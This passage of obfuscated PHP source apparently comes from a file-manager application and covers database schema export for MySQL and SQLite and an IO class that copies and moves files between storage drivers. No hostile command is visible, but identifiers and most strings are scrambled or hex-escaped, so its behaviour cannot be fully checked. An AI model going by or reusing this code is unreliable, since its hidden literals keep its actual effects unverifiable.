($ØÚá˜ğ == $Ç±²ÎƒÊ[853] ? $Ç±²ÎƒÊ[1144] : $Ç±²ÎƒÊ[1145]) . $Ç±²ÎƒÊ[1146]; preg_match_all($¨šÃ”éã, $‘ƒ¶³­‹, $Ÿó„ïøá); $È½Ş‡™ = $Ÿó„ïøá[1]; $·ôøé¿ = $this->model()->db(); $æ£ˆ„ì = $·ôøé¿->getTables(); $ì‘¾³… = TEMP_FILES . $Ç±²ÎƒÊ[1147] . date($Ç±²ÎƒÊ[272]) . $Ç±²ÎƒÊ[8]; del_dir($ì‘¾³…); mk_dir($ì‘¾³…); $íú’úô³ = $ì‘¾³… . $Ç±²ÎƒÊ[1148]; $õš¶º… = $ì‘¾³… . $Ç±²ÎƒÊ[1149]; $±ñ™›‚å = $ØÚá˜ğ == $Ç±²ÎƒÊ[13] ? $Ç±²ÎƒÊ[853] : $Ç±²ÎƒÊ[13]; IO::copy(CONTROLLER_DIR . "\151\156\163\164\x61\154\x6c\x2f\144\141\x74\141\57{$±ñ™›‚å}\x2e\x73\x71\x6c", $ì‘¾³…); @touch($ì‘¾³… . $ØÚá˜ğ . $Ç±²ÎƒÊ[837]); $µ®ìÄ = fopen($íú’úô³, $Ç±²ÎƒÊ[1122]); $µÍÊò = fopen($õš¶º…, $Ç±²ÎƒÊ[1122]); if ($ØÚá˜ğ == $Ç±²ÎƒÊ[13]) { $æ£ˆ„ì = array_diff($æ£ˆ„ì, array($Ç±²ÎƒÊ[829], $Ç±²ÎƒÊ[830])); $—«½ì†³ = array($Ç±²ÎƒÊ[1150], $Ç±²ÎƒÊ[1151], $Ç±²ÎƒÊ[1152]); fwrite($µÍÊò, implode(PHP_EOL, $—«½ì†³) . PHP_EOL . PHP_EOL); foreach ($æ£ˆ„ì as $ÔÖøòŒÑ) { $ï™ˆ©¹ = $this->sqlFromSqlite($ÔÖøòŒÑ); if (!$ï™ˆ©¹[$Ç±²ÎƒÊ[13]]) { continue; } fwrite($µÍÊò, $ï™ˆ©¹[$Ç±²ÎƒÊ[13]] . PHP_EOL . PHP_EOL); if (!in_array($ÔÖøòŒÑ, $È½Ş‡™)) { fwrite($µ®ìÄ, $ï™ˆ©¹[$Ç±²ÎƒÊ[853]] . PHP_EOL . PHP_EOL); } } } else { foreach ($æ£ˆ„ì as $ÔÖøòŒÑ) { $ï™ˆ©¹ = $this->sqlFromMysql($ÔÖøòŒÑ); if (!$ï™ˆ©¹[$Ç±²ÎƒÊ[853]]) { continue; } fwrite($µ®ìÄ, $ï™ˆ©¹[$Ç±²ÎƒÊ[853]] . PHP_EOL . PHP_EOL); if (!in_array($ÔÖøòŒÑ, $È½Ş‡™)) { fwrite($µÍÊò, $ï™ˆ©¹[$Ç±²ÎƒÊ[13]] . PHP_EOL . PHP_EOL); } } } fclose($µ®ìÄ); fclose($µÍÊò); $‘ƒ¶³­‹ = array($Ç±²ÎƒÊ[853] => $íú’úô³, $Ç±²ÎƒÊ[13] => $õš¶º…); return $õÚ¹òèĞ ? $‘ƒ¶³­‹[$õÚ¹òèĞ] : $‘ƒ¶³­‹; } public function dbType($æìµêı  = false) { $½ÏÛ½¦ =& $_SERVER[ìïæ“œî]; $„Ğ º½„ = $æìµêı  ? $GLOBALS[$½ÏÛ½¦[6]][$½ÏÛ½¦[21]] : $this->database; $„Ğ º½„ = array_change_key_case($„Ğ º½„); $Ù–„‹µç = $„Ğ º½„[$½ÏÛ½¦[1022]]; if ($Ù–„‹µç == $½ÏÛ½¦[1019]) { $ÁÙÍ”„“ = explode($½ÏÛ½¦[4], $„Ğ º½„[$½ÏÛ½¦[1028]]); $Ù–„‹µç = $ÁÙÍ”„“[0]; } $ÀšÁÄ¹ = array($½ÏÛ½¦[1153] => $½ÏÛ½¦[13], $½ÏÛ½¦[967] => $½ÏÛ½¦[853]); if (isset($ÀšÁÄ¹[$Ù–„‹µç])) { $Ù–„‹µç = $ÀšÁÄ¹[$Ù–„‹µç]; } return $Ù–„‹µç; } public function sqlFromMysql($Üóåª½, $¥œñÙµü = '') { $Â°—©ÇÒ =& $_SERVER[ìïæ“œî]; $²üç«ÃÂ = $this->model()->db(); $¤ú±èÃ· = $²üç«ÃÂ->query($Â°—©ÇÒ[1154] . $Üóåª½ . $Â°—©ÇÒ[461]); if (!$¤ú±èÃ· || !$¤ú±èÃ·[0]) { return !1; } $§°¥«àë = _get($¤ú±èÃ·[0], $Â°—©ÇÒ[1155], $Â°—©ÇÒ[12]); if (!$§°¥«àë) { return !1; } $ˆ¶¥ãÈŠ = "\104\122\117\x50\40\124\101\102\114\105\x20\111\106\x20\105\130\111\123\x54\x53\x20\140{$Üóåª½}\140\73" . PHP_EOL . $§°¥«àë . $Â°—©ÇÒ[74]; if ($¥œñÙµü && $¥œñÙµü == $Â°—©ÇÒ[853]) { return $ˆ¶¥ãÈŠ; } $ÃÓªÍÂß = array_change_key_case($GLOBALS[$Â°—©ÇÒ[6]][$Â°—©ÇÒ[21]]); $‡úÄÁâ = $ÃÓªÍÂß[$Â°—©ÇÒ[1027]]; $íøùÑßĞ = $Â°—©ÇÒ[1156] . $‡úÄÁâ . $Â°—©ÇÒ[1157] . $Üóåª½ . $Â°—©ÇÒ[58]; $ÎÚõéÁ˜ = $Â°—©ÇÒ[1158] . $Üóåª½ . $Â°—©ÇÒ[955]; $ÓÛéÇÉ– = $²üç«ÃÂ->query($íøùÑßĞ); if (empty($ÓÛéÇÉ–)) { $üÀĞ®–¿ = array($Â°—©ÇÒ[853] => $Â°—©ÇÒ[12], $Â°—©ÇÒ[13] => $Â°—©ÇÒ[12]); return $¥œñÙµü ? $üÀĞ®–¿[$¥œñÙµü] : $üÀĞ®–¿; } $­é©‘Å¡ = $²üç«ÃÂ->query($ÎÚõéÁ˜); $µ‚¬¶§Ì = $Â°—©ÇÒ[12]; $‚Ñ€²°ì = array(); foreach ($­é©‘Å¡ as $ú Åùï¬) { if (!$µ‚¬¶§Ì && $ú Åùï¬[$Â°—©ÇÒ[1159]] == $Â°—©ÇÒ[1160]) { $µ‚¬¶§Ì = $ú Åùï¬[$Â°—©ÇÒ[1161]]; } if (isset($‚Ñ€²°ì[$ú Åùï¬[$Â°—©ÇÒ[1159]]])) { $‚Ñ€²°ì[$ú Åùï¬[$Â°—©ÇÒ[1159]]][$Â°—©ÇÒ[1162]][] = $ú Åùï¬[$Â°—©ÇÒ[1161]]; continue; } $‚Ñ€²°ì[$ú Åùï¬[$Â°—©ÇÒ[1159]]] = array($Â°—©ÇÒ[1163] => $ú Åùï¬[$Â°—©ÇÒ[1159]], $Â°—©ÇÒ[1162] => array($ú Åùï¬[$Â°—©ÇÒ[1161]]), $Â°—©ÇÒ[1164] => $ú Åùï¬[$Â°—©ÇÒ[1165]] == $Â°—©ÇÒ[91] ? 0 : 1); } $ñÙâÉâ† = array(); foreach ($‚Ñ€²°ì as $ú Åùï¬) { $¾ê­ÎËç = $ú Åùï¬[$Â°—©ÇÒ[1163]] == $Â°—©ÇÒ[1160]; $ÔéüÀœ¼ = array($Â°—©ÇÒ[1166], $ú Åùï¬[$Â°—©ÇÒ[1164]] == $Â°—©ÇÒ[91] && !$¾ê­ÎËç ? $Â°—©ÇÒ[1167] : $Â°—©ÇÒ[12], $Â°—©ÇÒ[1168], $Â°—©ÇÒ[1169] . $Üóåª½ . $Â°—©ÇÒ[11] . ($¾ê­ÎËç ? $Â°—©ÇÒ[1170] : $ú Åùï¬[$Â°—©ÇÒ[1163]]) . $Â°—©ÇÒ[121], $Â°—©ÇÒ[1171], $Â°—©ÇÒ[121] . $Üóåª½ . $Â°—©ÇÒ[121], $Â°—©ÇÒ[1172] . implode($Â°—©ÇÒ[1173], $ú Åùï¬[$Â°—©ÇÒ[1162]]) . $Â°—©ÇÒ[1174]); $ñÙâÉâ†[] = implode($Â°—©ÇÒ[53], $ÔéüÀœ¼) . $Â°—©ÇÒ[74]; } $À»îü« = array(); $®‘¦›¬ = array($Â°—©ÇÒ[1175] => $Â°—©ÇÒ[1176], $Â°—©ÇÒ[1176] => $Â°—©ÇÒ[1176], $Â°—©ÇÒ[364] => $Â°—©ÇÒ[391], $Â°—©ÇÒ[363] => $Â°—©ÇÒ[391]); foreach ($ÓÛéÇÉ– as $ú Åùï¬) { $ÔéüÀœ¼ = array($Â°—©ÇÒ[121] . $ú Åùï¬[$Â°—©ÇÒ[1177]] . $Â°—©ÇÒ[121], isset($®‘¦›¬[$ú Åùï¬[$Â°—©ÇÒ[1178]]]) ? $®‘¦›¬[$ú Åùï¬[$Â°—©ÇÒ[1178]]] : $ú Åùï¬[$Â°—©ÇÒ[1179]], $ú Åùï¬[$Â°—©ÇÒ[1180]] == $Â°—©ÇÒ[953] ? $Â°—©ÇÒ[1181] : $Â°—©ÇÒ[1182], $ú Åùï¬[$Â°—©ÇÒ[1177]] == $µ‚¬¶§Ì ? $Â°—©ÇÒ[1183] : $Â°—©ÇÒ[12], $ú Åùï¬[$Â°—©ÇÒ[1004]] ? strtoupper(str_replace($Â°—©ÇÒ[11], $Â°—©ÇÒ[12], $ú Åùï¬[$Â°—©ÇÒ[1004]])) : $Â°—©ÇÒ[12]); $À»îü«[] = trim(implode($Â°—©ÇÒ[53], $ÔéüÀœ¼)); } $÷œÕÜœğ = array($Â°—©ÇÒ[1184] . $Üóåª½ . $Â°—©ÇÒ[1185], $Â°—©ÇÒ[1186] . $Üóåª½ . $Â°—©ÇÒ[1187], implode($Â°—©ÇÒ[50] . PHP_EOL, $À»îü«), $Â°—©ÇÒ[1001]); $Æ„îˆÖ˜ = implode(PHP_EOL, array_merge($÷œÕÜœğ, $ñÙâÉâ†)); if ($¥œñÙµü && $¥œñÙµü == $Â°—©ÇÒ[13]) { return $Æ„îˆÖ˜; } $üÀĞ®–¿ = array($Â°—©ÇÒ[853] => $ˆ¶¥ãÈŠ, $Â°—©ÇÒ[13] => $Æ„îˆÖ˜); return $¥œñÙµü ? $üÀĞ®–¿[$¥œñÙµü] : $üÀĞ®–¿; } public function sqlFromSqlite($¢„€ëíŒ, $œĞÉŒ–Å = '') { $œµµşğ¹ =& $_SERVER[ìïæ“œî]; $«Ú „ = $this->model()->db(); $·ãÁïßè = "\120\122\101\107\x4d\x41\40\x54\x41\102\114\105\x5f\111\x4e\x46\117\40\x28\x27{$¢„€ëíŒ}\x27\51"; $Õ‡¦¡Ù´ = "\123\x45\x4c\105\x43\124\x20\x2a\x20\106\x52\117\x4d\x20\x73\161\154\151\x74\x65\x5f\155\141\x73\164\x65\162\40\127\x48\105\122\x45\40\x74\x62\x6c\x5f\156\141\x6d\145\x20\75\40\47{$¢„€ëíŒ}\x27"; $Ù¤œÜè‚ = $«Ú „->query($·ãÁïßè); if (empty($Ù¤œÜè‚)) { $ÙíÚ…Ù® = array($œµµşğ¹[853] => $œµµşğ¹[12], $œµµşğ¹[13] => $œµµşğ¹[12]); return $œĞÉŒ–Å ? $ÙíÚ…Ù®[$œĞÉŒ–Å] : $ÙíÚ…Ù®; } $½ Ê¨¥Ù = $«Ú „->query($Õ‡¦¡Ù´); $Ö×¯±¶­ = $¦şÏ¹Ø¯ = array(); foreach ($½ Ê¨¥Ù as $İõÏ­¸Ì) { if ($İõÏ­¸Ì[$œµµşğ¹[33]] == $œµµşğ¹[356]) { $Ö×¯±¶­[] = $İõÏ­¸Ì[$œµµşğ¹[1188]]; } else { $¦şÏ¹Ø¯[$İõÏ­¸Ì[$œµµşğ¹[32]]] = $İõÏ­¸Ì[$œµµşğ¹[1188]]; } } $ÚÄ¶êµ¸ = array_merge(array($œµµşğ¹[1184] . $¢„€ëíŒ . $œµµşğ¹[121]), $Ö×¯±¶­, array_values($¦şÏ¹Ø¯)); $ÚÄ¶êµ¸ = implode($œµµşğ¹[74] . PHP_EOL, $ÚÄ¶êµ¸) . $œµµşğ¹[74]; if ($œĞÉŒ–Å && $œĞÉŒ–Å == $œµµşğ¹[13]) { return $ÚÄ¶êµ¸; } $óÒÔ¼ËÉ = array(); $›õæÖİ = array($œµµşğ¹[1176] => $œµµşğ¹[1189], $œµµşğ¹[391] => $œµµşğ¹[1190]); $–ºÖ§Ç‡ = $œµµşğ¹[12]; foreach ($Ù¤œÜè‚ as $İõÏ­¸Ì) { if ($İõÏ­¸Ì[$œµµşğ¹[57]] == $œµµşğ¹[91]) { $–ºÖ§Ç‡ = $İõÏ­¸Ì[$œµµşğ¹[32]]; } $Âı‹ü¤ = array($œµµşğ¹[461] . $İõÏ­¸Ì[$œµµşğ¹[32]] . $œµµşğ¹[461], isset($›õæÖİ[$İõÏ­¸Ì[$œµµşğ¹[33]]]) ? $›õæÖİ[$İõÏ­¸Ì[$œµµşğ¹[33]]] : $İõÏ­¸Ì[$œµµşğ¹[33]], $İõÏ­¸Ì[$œµµşğ¹[35]] == $œµµşğ¹[91] ? $œµµşğ¹[1181] : $œµµşğ¹[1191] . $İõÏ­¸Ì[$œµµşğ¹[56]], $İõÏ­¸Ì[$œµµşğ¹[57]] == $œµµşğ¹[91] ? $œµµşğ¹[1192] : $œµµşğ¹[12]); $óÒÔ¼ËÉ[] = trim(implode($œµµşğ¹[53], $Âı‹ü¤)); } foreach ($¦şÏ¹Ø¯ as $ÀØÕÜÌÚ => $ıİñ”ÊÈ) { $Ï¨Â²Ô³ = str_replace($œµµşğ¹[1193] . $¢„€ëíŒ . $œµµşğ¹[11], $œµµşğ¹[12], $ÀØÕÜÌÚ); $Æ÷Ûä€§ = str_replace(array($œµµşğ¹[121], $œµµşğ¹[1012]), $œµµşğ¹[461], substr($ıİñ”ÊÈ, stripos($ıİñ”ÊÈ, $œµµşğ¹[337]))); if ($Ï¨Â²Ô³ == $œµµşğ¹[1170]) { $Ò½º¬ˆå = $œµµşğ¹[1194] . $–ºÖ§Ç‡ . $œµµşğ¹[1195]; } else { $Ò½º¬ˆå = (stripos($Ï¨Â²Ô³, $œµµşğ¹[11]) ? $œµµşğ¹[1196] : $œµµşğ¹[12]) . ($œµµşğ¹[1197] . $Ï¨Â²Ô³ . $œµµşğ¹[1198] . $Æ÷Ûä€§); } $óÒÔ¼ËÉ[] = $Ò½º¬ˆå; } $ ×«‡¬ = array($œµµşğ¹[1199] . $¢„€ëíŒ . $œµµşğ¹[1200], $œµµşğ¹[1201] . $¢„€ëíŒ . $œµµşğ¹[1202], implode($œµµşğ¹[50] . PHP_EOL, $óÒÔ¼ËÉ), $œµµşğ¹[1203]); $ŸİÒ´¨è = implode(PHP_EOL, $ ×«‡¬); if ($œĞÉŒ–Å && $œĞÉŒ–Å == $œµµşğ¹[853]) { return $ŸİÒ´¨è; } $ÙíÚ…Ù® = array($œµµşğ¹[853] => $ŸİÒ´¨è, $œµµşğ¹[13] => $ÚÄ¶êµ¸); return $œĞÉŒ–Å ? $ÙíÚ…Ù®[$œĞÉŒ–Å] : $ÙíÚ…Ù®; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($…×éÃ£Ì, $²ËÓùÑ“) { $­ø—•© =& $_SERVER[ìïæ“œî]; $Ùã‡¬Ş³ = $²ËÓùÑ“; $GLOBALS[$­ø—•©[1204]] = $­ø—•©[1205] . $…×éÃ£Ì; Hook::trigger($­ø—•©[1205] . $…×éÃ£Ì . $­ø—•©[1206], $Ùã‡¬Ş³); $“ïì˜‹– = self::driverMake($²ËÓùÑ“[0]); if (!$“ïì˜‹–) { return !1; } if (method_exists($“ïì˜‹–, $…×éÃ£Ì)) { $ó«Ò—èÒ = @call_user_func_array(array($“ïì˜‹–, $…×éÃ£Ì), $²ËÓùÑ“); } else { if (method_exists($“ïì˜‹–, $­ø—•©[1207])) { $ó«Ò—èÒ = @call_user_func_array(array($“ïì˜‹–, $…×éÃ£Ì), $²ËÓùÑ“); } else { if (method_exists(self, $…×éÃ£Ì)) { $ó«Ò—èÒ = @call_user_func_array(array(self, $…×éÃ£Ì), $²ËÓùÑ“); } else { $ó«Ò—èÒ = call_user_func_array(array(parent, $…×éÃ£Ì), $²ËÓùÑ“); } } } Hook::trigger($­ø—•©[1205] . $…×éÃ£Ì . $­ø—•©[1208], $Ùã‡¬Ş³, $ó«Ò—èÒ); return $ó«Ò—èÒ; } public static function init($Ñåó÷ø«) { return self::driverMake($Ñåó÷ø«); } public static function copy($ó˜¸ïŠó, $È’êÀĞü, $´‚µŞÂÊ = false, $Èö˜‚ = false) { return self::copyMoveStart($ó˜¸ïŠó, $È’êÀĞü, $´‚µŞÂÊ, $_SERVER[ìïæ“œî][618], $Èö˜‚); } public static function move($›Û²€ó, $ÉŸ°í·Ù, $ÖïîŸ¥ø = false, $´½ÍğØó = false) { return self::copyMoveStart($›Û²€ó, $ÉŸ°í·Ù, $ÖïîŸ¥ø, $_SERVER[ìïæ“œî][620], $´½ÍğØó); } private static function copyMoveStart($ ‡ÖƒÃï, $Ø¾±åîÖ, $éô‚½“, $ËÇ¯Ô‘, $Ë©÷óÑ) { $­øÌõØÛ =& $_SERVER[ìïæ“œî]; $¬‰ÔäÕ = array($ ‡ÖƒÃï, $Ø¾±åîÖ, $éô‚½“, $Ë©÷óÑ); Hook::trigger($­øÌõØÛ[1205] . $ËÇ¯Ô‘ . $­øÌõØÛ[1206], $¬‰ÔäÕ); $ƒè¤ªø = self::copyMove($ ‡ÖƒÃï, $Ø¾±åîÖ, $éô‚½“, $ËÇ¯Ô‘, $Ë©÷óÑ); Hook::trigger($­øÌõØÛ[1205] . $ËÇ¯Ô‘ . $­øÌõØÛ[1208], $¬‰ÔäÕ, $ƒè¤ªø); return $ƒè¤ªø; } public static function saveFile($é…Ò´œÔ, $ÇùÄóÔ, $ÜÏˆÛÂ = true) { $‰ØÊôæó =& $_SERVER[ìïæ“œî]; $›—±ëß­ = self::info($ÇùÄóÔ); $úÃŠË–Ü = self::driverMake($é…Ò´œÔ); $€ô¿Ò™Ê = self::driverMake($ÇùÄóÔ); $ö°‘§ = !1; if ($€ô¿Ò™Ê->pathParse[$‰ØÊôæó[1209]]) { $ö°‘§ = $€ô¿Ò™Ê; $íÀ‡–¯÷ = $€ô¿Ò™Ê->pathParse[$‰ØÊôæó[1209]]; $€ô¿Ò™Ê = self::driverMake($íÀ‡–¯÷); } if ($úÃŠË–Ü->pathParse[$‰ØÊôæó[1209]]) { $¶­‚ÃÒé = $úÃŠË–Ü->pathParse[$‰ØÊôæó[1209]]; $úÃŠË–Ü = self::driverMake($¶­‚ÃÒé); } $ ìô¦ = $€ô¿Ò™Ê->pathFather($ÇùÄóÔ); $³¶†šà„ = !0; if (!$ÜÏˆÛÂ && self::driverIsSame($úÃŠË–Ü, $€ô¿Ò™Ê)) { $³¶†šà„ = !1; } $‹ù»ª‘Ú = self::copyFile($úÃŠË–Ü, $é…Ò´œÔ, $€ô¿Ò™Ê, $ ìô¦, $›—±ëß­[$‰ØÊôæó[32]], $³¶†šà„); if ($ö°‘§) { $‹ù»ª‘Ú = $ö°‘§->getPathOuter($‹ù»ª‘Ú); } return $‹ù»ª‘Ú; } private static function copyMove($š®ÚŒŒ, $Øóí²®½, $Î¡¾ö„„, $³¯Û±½‹, $Æµ“÷•Ö = false) { $¨Œí¦Õ° =& $_SERVER[ìïæ“œî]; if (!$š®ÚŒŒ || $š®ÚŒŒ == $¨Œí¦Õ°[8] || !$Øóí²®½) { return !1; } ignore_timeout(); $ÊÚş·İÓ = self::driverMake($š®ÚŒŒ); $²Áı€Û¢ = self::driverMake($Øóí²®½); $àéå¿Èû = $³¯Û±½‹ == $¨Œí¦Õ°[620]; $õÅ¿ ¦ = !1; if ($²Áı€Û¢->pathParse[$¨Œí¦Õ°[1209]]) { $õÅ¿ ¦ = $²Áı€Û¢; $Øóí²®½ = $²Áı€Û¢->pathParse[$¨Œí¦Õ°[1209]]; $²Áı€Û¢ = self::driverMake($Øóí²®½); } if ($ÊÚş·İÓ->pathParse[$¨Œí¦Õ°[1209]]) { $š®ÚŒŒ = $ÊÚş·İÓ->pathParse[$¨Œí¦Õ°[1209]]; $ÊÚş·İÓ = self::driverMake($š®ÚŒŒ); } self::check($ÊÚş·İÓ, $š®ÚŒŒ, $²Áı€Û¢, $Øóí²®½); Hook::trigger($¨Œí¦Õ°[1210], $ÊÚş·İÓ, $š®ÚŒŒ, $²Áı€Û¢, $Øóí²®½); $×ıñüøæ = self::driverIsSame($ÊÚş·İÓ, $²Áı€Û¢); if ($×ıñüøæ) { if ($³¯Û±½‹ == $¨Œí¦Õ°[620] && !method_exists($²Áı€Û¢, $¨Œí¦Õ°[1211]) && trim($Øóí²®½, $¨Œí¦Õ°[8]) == trim($²Áı€Û¢->pathFather($š®ÚŒŒ), $¨Œí¦Õ°[8])) { if ($ÊÚş·İÓ->pathThis($š®ÚŒŒ) != $Æµ“÷•Ö && !$ÊÚş·İÓ->isOsDriver()) { return $ÊÚş·İÓ->rename($š®ÚŒŒ, $Æµ“÷•Ö); } return $²Áı€Û¢->getPathOuter($š®ÚŒŒ); } if (method_exists($²Áı€Û¢, $³¯Û±½‹)) { return $²Áı€Û¢->{$³¯Û±½‹}($š®ÚŒŒ, $Øóí²®½, $Î¡¾ö„„, $Æµ“÷•Ö); } } if ($×ıñüøæ && $³¯Û±½‹ == $¨Œí¦Õ°[620] && $²Áı€Û¢->getType() == $¨Œí¦Õ°[109]) { $µúåş€Æ = $²Áı€Û¢->movePath($š®ÚŒŒ, $Øóí²®½, $Æµ“÷•Ö); if ($µúåş€Æ) { return $µúåş€Æ; } } $Şã¸€¢¢ = $ÊÚş·İÓ->isFile($š®ÚŒŒ); if (!$Şã¸€¢¢ && $²Áı€Û¢->getType() == $¨Œí¦Õ°[806] && $ÊÚş·İÓ->getType() == $¨Œí¦Õ°[109]) { $µúåş€Æ = $²Áı€Û¢->copyFolderFromIO($ÊÚş·İÓ, $š®ÚŒŒ, $Øóí²®½, $Î¡¾ö„„, $àéå¿Èû, $Æµ“÷•Ö); } else { $µúåş€Æ = self::copyPath($ÊÚş·İÓ, $š®ÚŒŒ, $²Áı€Û¢, $Øóí²®½, $Î¡¾ö„„, $àéå¿Èû, $Şã¸€¢¢, $Æµ“÷•Ö); } if ($µúåş€Æ && $àéå¿Èû) { $ÊÚş·İÓ->remove($š®ÚŒŒ); } if ($õÅ¿ ¦) { $µúåş€Æ = $õÅ¿ ¦->getPathOuter($µúåş€Æ); } return $µúåş€Æ; } private static function check($·Ã‹ôä, $öâ·Å÷É, $œ–ß‚öÛ, &$È¯œ¾è¹) { $ Àà‡…Ñ =& $_SERVER[ìïæ“œî]; if (self::driverIsSame($·Ã‹ôä, $œ–ß‚öÛ) && $·Ã‹ôä->isFolder($öâ·Å÷É) && $·Ã‹ôä->isParentOf($öâ·Å÷É, $È¯œ¾è¹)) { show_json(LNG($ Àà‡…Ñ[1212]), !1); } if (!$·Ã‹ôä->exist($öâ·Å÷É)) { show_json(LNG($ Àà‡…Ñ[108]), !1); } } private static function copyPath($ÏÕß“³Ÿ, $Òıâß°à, $ìÜ­Ş‘, $‡Á€ä’, $î¯£ÈÃõ, $òÖ³íŞë, $û»†ªû«, $Áã—¿ôÌ = false, $àÚ‰¸—Ç = true) { $úÙ¨ŞØ =& $_SERVER[ìïæ“œî]; $‰äÉÖ± = empty($Áã—¿ôÌ) && $Áã—¿ôÌ !== $úÙ¨ŞØ[228] ? $ÏÕß“³Ÿ->pathThis($Òıâß°à) : $Áã—¿ôÌ; if ($î¯£ÈÃõ) { $¯ŠıÚÄ = $ìÜ­Ş‘->fileNameExist($‡Á€ä’, $‰äÉÖ±); $¶òš¢¢Å = $‰äÉÖ±; $‰äÉÖ± = $ìÜ­Ş‘->fileNameAuto($‡Á€ä’, $‰äÉÖ±, $î¯£ÈÃõ, !$û»†ªû«); if (!$¯ŠıÚÄ || $¶òš¢¢Å != $‰äÉÖ±) { $î¯£ÈÃõ = !1; } if ($àÚ‰¸—Ç && !$î¯£ÈÃõ) { $ìÜ­Ş‘->_data[$úÙ¨ŞØ[1213]] = !0; } } if ($û»†ªû«) { return self::copyFile($ÏÕß“³Ÿ, $Òıâß°à, $ìÜ­Ş‘, $‡Á€ä’, $‰äÉÖ±, $òÖ³íŞë); } if ($î¯£ÈÃõ == REPEAT_RENAME_FOLDER) { $î¯£ÈÃõ = !1; } $í¯¶¯É˜ = rtrim($‡Á€ä’, $úÙ¨ŞØ[8]) . $úÙ¨ŞØ[8] . $‰äÉÖ±; $ÍÇŞå±ì = $ìÜ­Ş‘->mkdir($ìÜ­Ş‘->getPath($í¯¶¯É˜), $î¯£ÈÃõ); $‡Á€ä’ = $ìÜ­Ş‘->getPathInner($ÍÇŞå±ì); $İç£¼Ë× = $ÏÕß“³Ÿ->listPath($Òıâß°à, !0); $İç£¼Ë× = is_array($İç£¼Ë×) ? $İç£¼Ë× : array($úÙ¨ŞØ[86] => array(), $úÙ¨ŞØ[85] => array()); $ìêøÖ¾¢ = array_merge($İç£¼Ë×[$úÙ¨ŞØ[86]], $İç£¼Ë×[$úÙ¨ŞØ[85]]); foreach ($ìêøÖ¾¢ as $Ì×Äš¼Ş) { $³õâ“âß = $Ì×Äš¼Ş[$úÙ¨ŞØ[33]] == $úÙ¨ŞØ[230]; $Òıâß°à = $ÏÕß“³Ÿ->getPathInner($Ì×Äš¼Ş[$úÙ¨ŞØ[87]]); $Õñë–Ùœ = self::copyPath($ÏÕß“³Ÿ, $Òıâß°à, $ìÜ­Ş‘, $‡Á€ä’, $î¯£ÈÃõ, $òÖ³íŞë, $³õâ“âß, !1, !1); if (!$Õñë–Ùœ) { IO::errorTips($úÙ¨ŞØ[1214] . $Òıâß°à . $úÙ¨ŞØ[73] . $‡Á€ä’); } } self::copyMoveKeepInfo($ÏÕß“³Ÿ, $Òıâß°à, $ÍÇŞå±ì); return $ÍÇŞå±ì; } private static function copyFile($³ù‰ã†, $ÕØ€×ä§, $¶™è¦Ç½, $ò‚¹°¡´, $ÊŞıëŒı, $äÒá¼æ) { $•§äï¯€ =& $_SERVER[ìïæ“œî]; $ò‚¹°¡´ = $¶™è¦Ç½->getPath(rtrim($ò‚¹°¡´, $•§äï¯€[8]) . $•§äï¯€[8] . $ÊŞıëŒı); $¸¨šÑü¡ = $•§äï¯€[1215] . time() . rand_string(5); Hook::trigger($•§äï¯€[1216], $³ù‰ã†, $ÕØ€×ä§, $¶™è¦Ç½, $ò‚¹°¡´, $ÊŞıëŒı, $¸¨šÑü¡); if (self::driverIsSame($³ù‰ã†, $¶™è¦Ç½)) { if ($äÒá¼æ) { $¼ßÆÚö² = $¶™è¦Ç½->moveFile($ÕØ€×ä§, $ò‚¹°¡´); } else { $¼ßÆÚö² = $¶™è¦Ç½->copyFile($ÕØ€×ä§, $ò‚¹°¡´); } Hook::trigger($•§äï¯€[1217], $³ù‰ã†, $ÕØ€×ä§, $¶™è¦Ç½, $ò‚¹°¡´, $ÊŞıëŒı, $¼ßÆÚö²); self::copyMoveKeepInfo($³ù‰ã†, $ÕØ€×ä§, $¼ßÆÚö²); return $¼ßÆÚö²; } $Ó·Úïµ± = TEMP_FILES; if ($GLOBALS[$•§äï¯€[6]][$•§äï¯€[92]][$•§äï¯€[845]]) { $Ó·Úïµ± = $GLOBALS[$•§äï¯€[6]][$•§äï¯€[92]][$•§äï¯€[845]]; } $½§»“ŠÓ = $Ó·Úïµ±; mk_dir($½§»“ŠÓ); $ÓÜ¡†÷ = $½§»“ŠÓ . $¸¨šÑü¡; $ğêö¶Æò = $ÓÜ¡†÷; $ÓÜ¡†÷ = $³ù‰ã†->download($ÕØ€×ä§, $ÓÜ¡†÷); $ÓÜ¡†÷ = $³ù‰ã†->iconvApp($ÓÜ¡†÷); if (substr($ÓÜ¡†÷, strlen($Ó·Úïµ±)) == $Ó·Úïµ±) { $äÒá¼æ = !0; } $¼ßÆÚö² = $¶™è¦Ç½->upload($ò‚¹°¡´, $ÓÜ¡†÷, $äÒá¼æ); self::remove($ğêö¶Æò); Hook::trigger($•§äï¯€[1217], $³ù‰ã†, $ÕØ€×ä§, $¶™è¦Ç½, $ò‚¹°¡´, $ÊŞıëŒı, $¼ßÆÚö²); self::copyMoveKeepInfo($³ù‰ã†, $ÕØ€×ä§, $¼ßÆÚö²); return $¼ßÆÚö²; } private static function copyMoveKeepInfo($½ëˆ£ñÕ, $¢«¾„æ, $­Ô­á‡Œ) { if (!$­Ô­á‡Œ) { return; } $€ë€ù¸‹ = $½ëˆ£ñÕ->info($¢«¾„æ); if (!is_array($€ë€ù¸‹)) { return; } IO::setModifyTime($­Ô­á‡Œ, $€ë€ù¸‹[$_SERVER[ìïæ“œî][88]]); } public static function pathFather($  ğàÛÅ) { $Üğ–à”¤ = IO::init($  ğàÛÅ); $Üç€£ÇŞ = $Üğ–à”¤->pathFather($Üğ–à”¤->path); return $Üğ–à”¤->getPathOuter($Üç€£ÇŞ); } public static function fileOut($ôß¸Àù, $øöØ¬Œ” = false, $œù‡ÃÛù = false, $›ó©ëÊ = '') { $ŒÊñ˜ü‚ = self::driverMake($ôß¸Àù); if ($ŒÊñ˜ü‚->isFileOutServer()) { return $ŒÊñ˜ü‚->fileOutServer($ôß¸Àù, $øöØ¬Œ”, $œù‡ÃÛù, $›ó©ëÊ); } return $ŒÊñ˜ü‚->fileOut($ôß¸Àù, $øöØ¬Œ”, $œù‡ÃÛù, $›ó©ëÊ); } public static function fileOutImage($êñ¶£úÄ, $áıÖ÷—ò = 250) { $ÅÀèƒ¾’ = array(250, 600, 1200, 2000, 3000, 5000); for ($±Ü˜õŒò = 0; $±Ü˜õŒò < count($ÅÀèƒ¾’); $±Ü˜õŒò++) { if ($±Ü˜õŒò == 0 && $áıÖ÷—ò <= $ÅÀèƒ¾’[$±Ü˜õŒò]) { $áıÖ÷—ò = 